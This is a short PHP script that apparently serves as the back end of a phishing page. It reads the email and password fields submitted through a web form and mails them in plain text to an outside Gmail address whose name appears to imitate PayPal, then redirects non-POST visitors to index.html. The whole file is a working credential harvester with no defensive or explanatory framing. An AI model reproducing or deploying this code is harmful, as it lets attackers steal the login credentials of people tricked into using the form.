<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Email details
    $to = "paypablemarksupply@gmail.com"; 
    $subject = "New Form Submission";
    $message = "Email: $email\nPassword: $password";

    // Send email
    if (mail($to, $subject, $message)) {
        echo "Email sent successfully!";
    } else {
        echo "Failed to send email. Please try again later.";
    }
} else {
    // Not a POST request, redirect back to the form
    header("Location: index.html");
    exit;
}
?>
